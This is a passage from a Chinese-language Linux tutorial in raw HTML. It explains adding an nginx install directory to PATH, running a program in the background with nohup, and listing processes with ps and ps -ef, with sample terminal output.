class=\"crayon-o\">/</span><span class=\"crayon-cn\">1.14.0</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n<p>第二个解决方案是将应用程序安装在可执行文件路径中的目录中。然而，这有时可能是办不到的，特别是如果您没有 root 权限。</p>\n<p>第三个解决方案是更新您的可执行路径环境变量，包括要使用的特定应用程序的安装目录。这个解决方案是与 shell 相关的。例如，Bash 用户需要在他们的 <code>.bashrc</code> 文件中编辑 <code>PATH=</code> 行。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6700d118b310000042\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nPATH=\"$HOME/web/prod/nginx/sbin:$PATH\"</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6700d118b310000042-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6700d118b310000042-1\"><span class=\"crayon-v\">PATH</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"$HOME/web/prod/nginx/sbin:$PATH\"</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0063 seconds] -->\r\n<p>现在，重复您的 <code>echo</code> 和 <code>which</code> 命令或者尝试检查版本。容易多了！</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6700d118e980881087\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nalan@workstation:~$ echo $PATH\r\n/home/alan/web/prod/nginx/sbin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin\r\n\r\nalan@workstation:~$ which nginx\r\n/home/alan/web/prod/nginx/sbin/nginx\r\n\r\nalan@workstation:~$ nginx -v                                                \r\nnginx version: nginx/1.14.0</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6700d118e980881087-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6700d118e980881087-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab6700d118e980881087-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6700d118e980881087-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab6700d118e980881087-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6700d118e980881087-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab6700d118e980881087-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6700d118e980881087-8\">8</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6700d118e980881087-1\"><span class=\"crayon-v\">alan</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">workstation</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">PATH</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6700d118e980881087-2\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">home</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">alan</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">web</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">prod</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">nginx</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sbin</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">local</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sbin</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">local</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sbin</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">bin</span></div><div class=\"crayon-line\" id=\"crayon-5bab6700d118e980881087-3\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6700d118e980881087-4\"><span class=\"crayon-v\">alan</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">workstation</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">which </span><span class=\"crayon-v\">nginx</span></div><div class=\"crayon-line\" id=\"crayon-5bab6700d118e980881087-5\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">home</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">alan</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">web</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">prod</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">nginx</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sbin</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">nginx</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6700d118e980881087-6\"> </div><div class=\"crayon-line\" id=\"crayon-5bab6700d118e980881087-7\"><span class=\"crayon-v\">alan</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">workstation</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nginx</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">v</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6700d118e980881087-8\"><span class=\"crayon-e\">nginx </span><span class=\"crayon-v\">version</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nginx</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">1.14.0</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0026 seconds] -->\r\n<p></p>\n<h3 id=\"toc_4\">保持进程运行</h3>\n<h4 id=\"toc_5\">NOHUP</h4>\n<p>注销或关闭终端时，进程可能不会继续运行。这种特殊情况可以通过在要使用 <code>nohup</code> 命令放在要运行的命令前面让进程持续运行。此外，附加一个<code>&amp;</code> 符号将会把进程发送到后台，并允许您继续使用终端。例如，假设您想运行 <code>myprogram.sh</code> 。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6700d1192128344134\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nnohup myprogram.sh &amp;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6700d1192128344134-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6700d1192128344134-1\"><span class=\"crayon-e\">nohup </span><span class=\"crayon-v\">myprogram</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">sh</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p><code>nohup</code> 会返回运行进程的 PID。接下来我会更多地谈论 PID。</p>\n<h3 id=\"toc_6\">管理正在运行的进程</h3>\n<p>每个进程都有一个唯一的进程标识号 (PID) 。这个数字是我们用来管理每个进程的。我们还可以使用进程名称，我将在下面演示。有几个命令可以检查正在运行的进程的状态。让我们快速看看这些命令。</p>\n<h4 id=\"toc_7\">PS</h4>\n<p>最常见的是 <code>ps</code> 命令。<code>ps</code> 的默认输出是当前终端中运行的进程的简单列表。如下所示，第一列包含 PID。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6700d1195811122611\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nalan@workstation:~$ ps\r\nPID TTY          TIME CMD\r\n23989 pts/0    00:00:00 bash\r\n24148 pts/0    00:00:00 ps</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6700d1195811122611-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6700d1195811122611-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab6700d1195811122611-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6700d1195811122611-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6700d1195811122611-1\"><span class=\"crayon-v\">alan</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">workstation</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ps</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6700d1195811122611-2\"><span class=\"crayon-e\">PID </span><span class=\"crayon-i\">TTY</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-e\">TIME </span><span class=\"crayon-i\">CMD</span></div><div class=\"crayon-line\" id=\"crayon-5bab6700d1195811122611-3\"><span class=\"crayon-cn\">23989</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pts</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">bash</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6700d1195811122611-4\"><span class=\"crayon-cn\">24148</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pts</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ps</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0064 seconds] -->\r\n<p>我想看看我之前启动的 Nginx 进程。为此，我告诉 <code>ps</code> 给我展示每一个正在运行的进程（<code>-e</code>）和完整的列表（<code>-f</code>）。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6700d1199239358395\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nalan@workstation:~$ ps -ef\r\nUID        PID  PPID  C STIME TTY          TIME CMD\r\nroot         1     0  0 Aug18 ?        00:00:10 /sbin/init splash\r\nroot         2     0  0 Aug18 ?        00:00:00 [kthreadd]\r\nroot         4     2  0 Aug18 ?        00:00:00 [kworker/0:0H]\r\nroot         6     2  0 Aug18 ?        00:00:00 [mm_percpu_wq]\r\nroot         7     2  0 Aug18 ?        00:00:00 [ksoftirqd/0]\r\nroot         8     2  0 Aug18 ?        00:00:20 [rcu_sched]\r\nroot         9     2  0 Aug18 ?        00:00:00 [rcu_bh]\r\nroot        10     2  0 Aug18 ?        00:00:00 [migration/0]\r\nroot        11     2  0 Aug18 ?        00:00:00 [watchdog/0]\r\nroot        12     2  0 Aug18 ?        00:00:00 [cpuhp/0]\r\nroot        13     2  0 Aug18 ?        00:00:00 [cpuhp/1]\r\nroot        14     2  0 Aug18 ?        00:00:00 [watchdog/1]\r\nroot        15     2  0 Aug18 ?        00:00:00 [migration/1]\r\nroot        16     2  0 Aug18 ?        00:00:00 [ksoftirqd/1]\r\nalan     20506 20496  0 10:39 pts/0    00:00:00 bash\r\nalan     20520  1454  0 10:39 ?        00:00:00 nginx: master process nginx\r\nalan     20521 20520  0 10:39 ?        00:00:00 nginx: worker process\r\nalan     20526 20506  0 10:39 pts/0    00:00:00 man ps\r\nalan     20536 20526  0 10:39 pts/0    00:00:00 pager\r\nalan     20564 20496  0 10:40 pts/1    00:00:00 bash</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6700d1199239358395-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6700d1199239358395-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab6700d1199239358395-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6700d1199239358395-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab6700d1199239358395-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6700d1199239358395-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab6700d1199239358395-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6700d1199239358395-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab6700d1199239358395-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6700d1199239358395-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5bab6700d1199239358395-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6700d1199239358395-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5bab6700d1199239358395-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6700d1199239358395-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5bab6700d1199239358395-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6700d1199239358395-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5bab6700d1199239358395-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6700d1199239358395-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5bab6700d1199239358395-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6700d1199239358395-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5bab6700d1199239358395-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6700d1199239358395-22\">22</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6700d1199239358395-1\"><span class=\"crayon-v\">alan</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">workstation</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ps</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">ef</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6700d1199239358395-2\"><span class=\"crayon-i\">UID</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-i\">PID</span><span class=\"crayon-h\"> </span> <span class=\"crayon-i\">PPID</span><span class=\"crayon-h\"> </span> <span class=\"crayon-i\">C</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">STIME </span><span class=\"crayon-i\">TTY</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-e\">TIME </span><span class=\"crayon-e\">CMD</span></div><div class=\"crayon-line\" id=\"crayon-5bab6700d1199239358395-3\"><span class=\"crayon-i\">root</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Aug18</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">10</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sbin</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">init </span><span class=\"crayon-e\">splash</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6700d1199239358395-4\"><span class=\"crayon-i\">root</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Aug18</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">kthreadd</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-5bab6700d1199239358395-5\"><span class=\"crayon-i\">root</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> 